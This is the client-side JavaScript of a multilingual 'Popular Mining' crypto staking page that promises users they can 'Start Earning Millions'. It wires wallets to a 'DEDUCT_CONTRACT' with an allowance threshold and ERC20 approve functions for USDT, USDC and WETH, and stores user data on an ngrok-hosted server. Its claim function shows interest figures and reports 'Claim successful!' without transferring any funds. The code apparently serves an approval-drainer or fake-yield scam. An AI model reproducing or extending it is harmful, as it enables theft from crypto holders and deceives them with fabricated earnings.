//---Client-side Constants---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';

//---ABI Definitions---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Language Control---
const translations = {
    'en': {
        title: 'Popular Mining',
        subtitle: 'Start Earning Millions',
        tabLiquidity: 'Liquidity',
        tabPledging: 'Pledging',
        grossOutputLabel: 'Gross Output',
        cumulativeLabel: 'Cumulative',
        walletBalanceLabel: 'Wallet Balance',
        accountBalanceLabel: 'Account Balance',
        compoundLabel: '⚡ Compound',
        nextBenefit: 'Next Benefit: 00:00:00',
        startBtnText: 'Start',
        pledgeAmountLabel: 'Pledge Amount',
        pledgeDurationLabel: 'Duration',
        pledgeBtnText: 'Pledge Now',
        totalPledgedLabel: 'Total Pledged',
        expectedYieldLabel: 'Expected Yield',
        apyLabel: 'APY',
        lockedUntilLabel: 'Locked Until',
        claimBtnText: 'Claim'
    },
    'zh-Hant': {
        title: '熱門挖礦',
        subtitle: '開始賺取數百萬',
        tabLiquidity: '流動性',
        tabPledging: '質押',
        grossOutputLabel: '總產出',
        cumulativeLabel: '累計',
        walletBalanceLabel: '錢包餘額',
        accountBalanceLabel: '帳戶餘額',
        compoundLabel: '⚡ 複利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '開始',
        pledgeAmountLabel: '質押金額',
        pledgeDurationLabel: '期間',
        pledgeBtnText: '立即質押',
        totalPledgedLabel: '總質押',
        expectedYieldLabel: '預期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '鎖定至',
        claimBtnText: '領取'
    },
    'zh-Hans': {
        title: '热门挖矿',
        subtitle: '开始赚取数百万',
        tabLiquidity: '流动性',
        tabPledging: '质押',
        grossOutputLabel: '总产出',
        cumulativeLabel: '累计',
        walletBalanceLabel: '钱包余额',
        accountBalanceLabel: '账户余额',
        compoundLabel: '⚡ 复利',
        nextBenefit: '下次收益: 00:00:00',
        startBtnText: '开始',
        pledgeAmountLabel: '质押金额',
        pledgeDurationLabel: '期间',
        pledgeBtnText: '立即质押',
        totalPledgedLabel: '总质押',
        expectedYieldLabel: '预期收益',
        apyLabel: '年化收益率',
        lockedUntilLabel: '锁定至',
        claimBtnText: '领取'
    }
};
let currentLang = 'en';

const languageSelect = document.getElementById('languageSelect');

const elements = {
    title: document.getElementById('title'),
    subtitle: document.getElementById('subtitle'),
    tabLiquidity: document.getElementById('tabLiquidity'),
    tabPledging: document.getElementById('tabPledging'),
    grossOutputLabel: document.getElementById('grossOutputLabel'),
    cumulativeLabel: document.getElementById('cumulativeLabel'),
    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
    compoundLabel: document.getElementById('compoundLabel'),
    nextBenefit: document.getElementById('nextBenefit'),
    startBtnText: document.getElementById('startBtn'),
    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
    pledgeBtnText: document.getElementById('pledgeBtn'),
    totalPledgedLabel: document.getElementById('totalPledgedLabel'),
    expectedYieldLabel: 'Expected Yield',
    apyLabel: 'APY',
    lockedUntilLabel: document.getElementById('lockedUntilLabel'),
    claimBtnText: claimBtn
};

function updateLanguage(lang) {
    currentLang = lang;
    languageSelect.value = lang;
    for (let key in elements) {
        if (elements[key] && translations[lang]?.[key]) {
            elements[key].textContent = translations[lang][key];
        }
    }
    if (claimBtn.parentNode) {
        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
    }
    // 新增：更新 modal 標題
    if (modalTitle) {
        modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
    }
    updateNextBenefitTimer();
    console.log(`updateLanguage: Switched to language: ${lang}`);
}


//---Global Variables & DOM Elements---
// (These are already declared above, but included here for completeness)
// const connectButton = document.getElementById('connectButton');
// const statusDiv = document.getElementById('status');
// const startBtn = document.getElementById('startBtn');
// const pledgeBtn = document.getElementById('pledgeBtn');
// const pledgeAmount = document.getElementById('pledgeAmount');
// const pledgeDuration = document.getElementById('pledgeDuration');
// const pledgeToken = document.getElementById('pledgeToken');
// const refreshWallet = document.getElementById('refreshWallet');
// const walletTokenSelect = document.getElementById('walletTokenSelect');
// const walletBalanceAmount = document.getElementById('walletBalanceAmount');
// const accountBalanceValue = document.getElementById('accountBalanceValue');
// const totalValue = document.getElementById('totalValue');
// // 修改：使用 getElementById 提高穩健性
// let grossOutputValue = document.getElementById('grossOutputValue');
// let cumulativeValue = document.getElementById('cumulativeValue');
// const nextBenefit = document.getElementById('nextBenefit');
// const claimBtn = document.createElement('button');
// claimBtn.id = 'claimButton';
// let provider, signer, userAddress;
// let deductContract, usdtContract, usdcContract, wethContract;
// let stakingStartTime = null;
// let claimedInterest = 0;
// let pledgedAmount = 0;
// let interestInterval = null;
// let nextBenefitInterval = null;
// let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };

//---Helper Function: Retry DOM Acquisition---
async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
    let attempts = 0;
    while (attempts < maxAttempts) {
        grossOutputValue = document.getElementById('grossOutputValue');
        cumulativeValue = document.getElementById('cumulativeValue');
        if (grossOutputValue && cumulativeValue) {
            console.log("retryDOMAcquisition: Successfully acquired DOM elements after", attempts + 1, "attempts.");
            return true;
        }
        console.warn("retryDOMAcquisition: Attempt", attempts + 1, "failed. Retrying after", delayMs, "ms...");
        await new Promise(resolve => setTimeout(resolve, delayMs));
        attempts++;
    }
    console.error("retryDOMAcquisition: Failed to acquire DOM elements after", maxAttempts, "attempts.");
    return false;
}


//---新增：從伺服器拉取用戶資料並同步本地---
async function loadUserDataFromServer() {
    if (!userAddress) return;
    try {
        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        if (response.ok) {
            const allData = await response.json();
            const userData = allData.users[userAddress];
            if (userData) {
                // 同步本地資料
                if (userData.stakingStartTime) {
                    stakingStartTime = parseInt(userData.stakingStartTime);
                    localStorage.setItem('stakingStartTime', userData.stakingStartTime);
                }
                if (userData.claimedInterest) {
                    claimedInterest = parseFloat(userData.claimedInterest);
                    localStorage.setItem('claimedInterest', userData.claimedInterest);
                }
                if (userData.pledgedAmount) {
                    pledgedAmount = parseFloat(userData.pledgedAmount);
                    localStorage.setItem('pledgedAmount', userData.pledgedAmount);
                }
                if (userData.nextBenefitTime) {
                    localStorage.setItem('nextBenefitTime', userData.nextBenefitTime);
                }
                if (userData.accountBalance) {
                    accountBalance = userData.accountBalance;
                    localStorage.setItem('accountBalance', JSON.stringify(userData.accountBalance));
                }
                console.log("loadUserDataFromServer: Synced user data from server:", userData);
                updateInterest();  // 重新計算 UI
                updateNextBenefitTimer();
            }
        }
    } catch (error) {
        console.warn("loadUserDataFromServer: Failed to load from server:", error);
    }
}

//---UI Control Functions---
async function saveUserData() {
    if (!userAddress) {
        console.log("saveUserData: No user address available, skipping save.");
        return;
    }
    const dataToSave = {
        stakingStartTime: localStorage.getItem('stakingStartTime'),
        claimedInterest: localStorage.getItem('claimedInterest'),
        pledgedAmount: localStorage.getItem('pledgedAmount'),
        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
        accountBalance: JSON.parse(localStorage.getItem('accountBalance'))
    };
    try {
        console.log("saveUserData: Sending data to server for address:", userAddress, dataToSave);
        const response = await fetch(`${API_BASE_URL}/api/user-data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true'
            },
            body: JSON.stringify({ address: userAddress, data: dataToSave })
        });
        console.log("saveUserData: Response status:", response.status);
        if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
        console.log("saveUserData: User data sent to server successfully.");
    } catch (error) {
        console.warn("saveUserData: Could not send user data to server:", error);
    }
}

function updateStatus(message, isWarning = false) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
    statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
    console.log(`updateStatus: ${isWarning ? 'Warning' : 'Info'}: ${message}`);
}

function resetState(showMsg = true) {
    console.log("resetState: Executing state reset...");
    signer = userAddress = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
    if (interestInterval) {
        clearInterval(interestInterval);
        console.log("resetState: Cleared interest interval:", interestInterval);
    }
    if (nextBenefitInterval) {
        clearInterval(nextBenefitInterval);
        console.log("resetState: Cleared next benefit interval:", nextBenefitInterval);
    }
    localStorage.clear();
    console.log("resetState: Local storage cleared.");
    if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
    }
    const existingClaimBtn = document.getElementById('claimButton');
    if (existingClaimBtn) {
        existingClaimBtn.remove();
        console.log("resetState: Removed claim button.");
    }
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
        console.log("resetState: Reset connect button state.");
    }
    disableInteractiveElements(true);
    if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
    if (walletTokenSelect) walletTokenSelect.value = 'USDT';
    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
    if (showMsg) updateStatus("Please connect your wallet to continue.");
}

function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
    console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`);
}

function updateBalancesUI(walletBalances) {
    if (!walletTokenSelect) return;
    const selectedToken = walletTokenSelect.value;
    const decimals = { USDT: 6, USDC: 6, WETH: 18 };
    const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
    const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
    if (walletBalanceAmount) {
        walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
        console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
    }
    const claimedBalance = accountBalance[selectedToken] || 0;
    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
    if (accountBalanceValue) {
        accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
        console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`);
    }
    if (parseFloat(formattedWalletBalance) < 0.001) {
        updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
    } else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
        updateStatus("");
    }
}

//---Core Wallet Logic---
async function getEthPrices() {
    try {
        updateStatus("Fetching latest prices...");
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        console.log("getEthPrices: Response status:", response.status);
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();
        console.log("getEthPrices: Received price data:", data);

        // 修改：加 fallback，如果 usdt missing，用 usd
        const usdPrice = data.ethereum?.usd || 0;
        const usdtPrice = data.ethereum?.usdt || usdPrice;  // Fallback to USD
        const prices = {
            usd: usdPrice,
            usdt: usdtPrice,
            usdc: usdPrice,  // USDC ≈ USD
            weth: usdPrice   // WETH ≈ ETH/USD, but for conversion, use 1:1 logic below if needed
        };
        console.log("getEthPrices: Processed prices:", prices);  // Debug log
        updateStatus("");
        return prices;
    } catch (error) {
        console.error("getEthPrices: Could not fetch ETH price:", error);
        updateStatus("Could not fetch price data.", true);
        return null;
    }
}

//--Remaining Code--
async function claimInterest() {
    const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
    const claimableETH = parseFloat(claimableETHString);
    console.log("claimInterest: Raw claimableETHString:", claimableETHString, "Parsed:", claimableETH);
    if (isNaN(claimableETH) || claimableETH < 0.0000001) {
        updateStatus("No claimable interest available or invalid value.");
        return;
    }

    // 獲取價格（原有邏輯）
    const prices = await getEthPrices();
    if (!prices || prices.usd === 0) {
        updateStatus("Failed to get price data. Please try again later.");
        return;
    }

    const selectedToken = walletTokenSelect.value;
    let ethToTokenRate = prices[selectedToken.toLowerCase()];
    if (isNaN(ethToTokenRate) || ethToTokenRate === 0) {
        // Fallback: USDT/USDC 用 USD, WETH 用 1 (ETH ≈ WETH)
        ethToTokenRate = selectedToken === 'WETH' ? 1 : prices.usd;
        console.warn(`claimInterest: Fallback rate for ${selectedToken}:`, ethToTokenRate);
    }
    const valueInToken = claimableETH * ethToTokenRate;
    console.log("claimInterest: Claim details:", { claimableETH, selectedToken, ethToTokenRate, valueInToken, prices });

    if (isNaN(valueInToken) || valueInToken <= 0) {
        updateStatus("Invalid calculation. Please refresh and try again.");
        return;
    }

    // 新增：顯示 Modal 而非 confirm
    modalClaimableETH.textContent = `${claimableETH.toFixed(7)} ETH`;
    modalEthPrice.textContent = `$${prices.usd.toFixed(2)}`;
    modalSelectedToken.textContent = selectedToken;
    modalEquivalentValue.textContent = `${valueInToken.toFixed(3)} ${selectedToken}`;
    modalTitle.textContent = translations[currentLang]?.claimBtnText || 'Claim Interest';
    claimModal.style.display = 'flex';

      // 新增：Modal 事件監聽器
    if (closeModal) closeModal.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (cancelClaim) cancelClaim.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (confirmClaim) {
        confirmClaim.addEventListener('click', async () => {
            claimModal.style.display = 'none';
            // Claim 成功後，accountBalance 歸零
            accountBalance[selectedToken] = 0; // 將選定的代幣的余额設為0
            localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
            console.log("claimInterest: Updated claimed interest and account balance:", { claimedInterest, accountBalance });
            updateInterest();
            const walletBalances = {
                usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
                usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
                weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
            };
            updateBalancesUI(walletBalances);
            updateStatus('Claim successful! Your Account Balance has been updated.');
            await saveUserData();
        });
    }
    // 點擊 modal 外部關閉
    if (claimModal) {
        claimModal.addEventListener('click', (e) => {
            if (e.target === claimModal) claimModal.style.display = 'none';
        });
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    const savedLang = localStorage.getItem('language') || 'en';
    updateLanguage(savedLang);
    console.log(typeof updateLanguage);  // 增加這個
    await initializeWallet();
    setInterval(updateTotalFunds, 1000);
    //---刷新資料
    document.getElementById('refreshData')?.addEventListener('click', async () => {
        console.log("refreshData: Manually refreshing data...");
        updateStatus('Refreshing data...');
        await loadUserDataFromServer();  // 重新載入資料
        updateStatus('');
        alert('Data refreshed!');
    });
});